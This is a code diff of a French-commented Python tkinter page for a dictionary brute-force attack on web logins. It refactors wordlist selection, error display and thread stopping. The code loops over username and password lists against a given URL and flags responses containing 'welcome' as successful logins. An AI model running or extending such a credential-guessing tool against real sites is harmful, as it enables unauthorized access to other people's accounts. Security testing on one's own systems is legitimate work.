@@ -1,5 +1,5 @@
 import tkinter as tk
-from tkinter import ttk, messagebox, filedialog
+from tkinter import ttk, filedialog
 import os
 import requests
 import threading
@@ -35,10 +35,7 @@ class bruteforcePage(tk.Frame):
             'Importer depuis mon PC'
         ]
         self.username_combobox.set('username.txt')  # Valeur par défaut
-
-        # Bouton pour confirmer le choix des logins
-        self.username_select_button = tk.Button(self, text="Confirmer le choix des Logins", command=self.handle_username_selection)
-        self.username_select_button.pack(pady=5)
+        self.username_combobox.bind("<<ComboboxSelected>>", self.handle_username_selection)
 
         # Fichiers des mots de passe
         self.password_label = tk.Label(self, text="Choisir un fichier des Mots de Passe:")
@@ -53,10 +50,7 @@ class bruteforcePage(tk.Frame):
             'Importer depuis mon PC'
         ]
         self.password_combobox.set('mdp.txt')  # Valeur par défaut
-
-        # Bouton pour confirmer le choix des mots de passe
-        self.password_select_button = tk.Button(self, text="Confirmer le choix des Mots de Passe", command=self.handle_password_selection)
-        self.password_select_button.pack(pady=5)
+        self.password_combobox.bind("<<ComboboxSelected>>", self.handle_password_selection)
 
         # Bouton pour démarrer l'attaque
         if self.show_button:
@@ -92,17 +86,18 @@ class bruteforcePage(tk.Frame):
 
         # Variables pour gérer l'état de l'attaque
         self.is_attack_running = False
-        self.stop_requested = False
+        self.stop_event = threading.Event()
+        self.attack_thread = None
 
-    def handle_username_selection(self):
+    def handle_username_selection(self, event=None):
         """Gérer la sélection du fichier des logins."""
         selection = self.username_combobox.get()
         default_folder = os.path.join(os.getcwd(), 'Dictionnaire')
 
         if selection == 'username.txt':
-            internal_file = os.path.join(default_folder, 'username.txt')
+            self.login_file_path = os.path.join(default_folder, 'username.txt')
         elif selection == 'dictionnaire username court.txt':
-            internal_file = os.path.join(default_folder, 'dictionnaire username court.txt')
+            self.login_file_path = os.path.join(default_folder, 'dictionnaire username court.txt')
         elif selection == 'Importer depuis mon PC':
             file_path = filedialog.askopenfilename(
                 title="Importer un fichier des Logins depuis mon PC",
@@ -110,30 +105,19 @@ class bruteforcePage(tk.Frame):
             )
             if file_path:
                 self.login_file_path = file_path
-                messagebox.showinfo("Fichier sélectionné", f"Fichier importé depuis le PC : {file_path}")
-                return
-            else:
-                self.login_file_path = None
-                messagebox.showwarning("Aucun fichier sélectionné", "Aucun fichier de logins n'a été sélectionné.")
-                return
-        else:
-            internal_file = None
+        
+        if self.login_file_path and not os.path.exists(self.login_file_path):
+            self.login_file_path = None
 
-        if internal_file and os.path.exists(internal_file):
-            self.login_file_path = internal_file
-            messagebox.showinfo("Fichier sélectionné", f"Fichier interne sélectionné : {internal_file}")
-        else:
-            messagebox.showerror("Erreur", f"Le fichier '{selection}' est introuvable dans le dossier 'Dictionnaire'.")
-
-    def handle_password_selection(self):
+    def handle_password_selection(self, event=None):
         """Gérer la sélection du fichier des mots de passe."""
         selection = self.password_combobox.get()
         default_folder = os.path.join(os.getcwd(), 'Dictionnaire')
 
         if selection == 'mdp.txt':
-            internal_file = os.path.join(default_folder, 'mdp.txt')
+            self.password_file_path = os.path.join(default_folder, 'mdp.txt')
         elif selection == 'dictionnaire mdp court.txt':
-            internal_file = os.path.join(default_folder, 'dictionnaire mdp court.txt')
+            self.password_file_path = os.path.join(default_folder, 'dictionnaire mdp court.txt')
         elif selection == 'Importer depuis mon PC':
             file_path = filedialog.askopenfilename(
                 title="Importer un fichier des Mots de Passe depuis mon PC",
@@ -141,27 +125,16 @@ class bruteforcePage(tk.Frame):
             )
             if file_path:
                 self.password_file_path = file_path
-                messagebox.showinfo("Fichier sélectionné", f"Fichier importé depuis le PC : {file_path}")
-                return
-            else:
-                self.password_file_path = None
-                messagebox.showwarning("Aucun fichier sélectionné", "Aucun fichier de mots de passe n'a été sélectionné.")
-                return
-        else:
-            internal_file = None
-
-        if internal_file and os.path.exists(internal_file):
-            self.password_file_path = internal_file
-            messagebox.showinfo("Fichier sélectionné", f"Fichier interne sélectionné : {internal_file}")
-        else:
-            messagebox.showerror("Erreur", f"Le fichier '{selection}' est introuvable dans le dossier 'Dictionnaire'.")
+        
+        if self.password_file_path and not os.path.exists(self.password_file_path):
+            self.password_file_path = None
 
     def start_attack(self):
         """Démarrer l'attaque brute force."""
         url = self.url_entry.get()
 
         if not url or not self.login_file_path or not self.password_file_path:
-            messagebox.showerror("Erreur", "Veuillez remplir l'URL et sélectionner les fichiers de logins et mots de passe.")
+            self.update_test_output("Erreur : Veuillez remplir l'URL et sélectionner les fichiers de logins et mots de passe.\n")
             return
 
         # Charger les logins et mots de passe à partir des fichiers
@@ -171,7 +144,7 @@ class bruteforcePage(tk.Frame):
             with open(self.password_file_path, 'r') as f:
                 passwords = f.readlines()
         except FileNotFoundError:
-            messagebox.showerror("Erreur", "Impossible de lire les fichiers sélectionnés.")
+            self.update_test_output("Erreur : Impossible de lire les fichiers sélectionnés.\n")
             return
 
         if self.start_button:
@@ -180,30 +153,28 @@ class bruteforcePage(tk.Frame):
             self.stop_button.config(state=tk.NORMAL)
         self.status_label.config(text="L'attaque est en cours...")
 
-        # Liste pour stocker les combinaisons valides
-        valid_combinations = []
+        # Réinitialiser l'événement d'arrêt
+        self.stop_event.clear()
 
-        self.is_attack_running = True
-        self.stop_requested = False
-
-        self.attack_thread = threading.Thread(target=self.run_attack, args=(url, logins, passwords, valid_combinations))
+        self.attack_thread = threading.Thread(target=self.run_attack, args=(url, logins, passwords))
         self.attack_thread.start()
 
-    def run_attack(self, url, logins, passwords, valid_combinations):
+    def run_attack(self, url, logins, passwords):
         """Effectuer l'attaque brute force dans un thread séparé."""
         results = []  # Liste des résultats (login, password, statut)
 
         for login in logins:
-            if self.stop_requested:
+            if self.stop_event.is_set():
                 break
             for password in passwords:
+                if self.stop_event.is_set():
+                    break
                 login = login.strip()
                 password = password.strip()
 
                 self.update_test_output(f"Tentative : {login} / {password}...\n")
 
                 if self.try_login(url, login, password):
-                    valid_combinations.append(f"{login} / {password}")
                     results.append((login, password, "Success"))
                     self.update_test_output(f"Réussi : {login} / {password}\n")
                 else:
@@ -244,14 +215,13 @@ class bruteforcePage(tk.Frame):
             if "welcome" in response.text.lower():  # Condition de succès
                 return True
         except requests.exceptions.RequestException as e:
-            messagebox.showerror("Erreur", f"Erreur de connexion : {e}")
+            self.update_test_output(f"Erreur de connexion : {e}\n")
         return False
 
     def stop_attack(self):
         """Arrêter l'attaque brute force."""
-        self.stop_requested = True
+        self.stop_event.set()
         self.status_label.config(text="L'attaque a été arrêtée.")
-        messagebox.showinfo("Arrêt", "L'attaque a été arrêtée.")
         if self.start_button:
             self.start_button.config(state=tk.NORMAL)
         if self.stop_button:
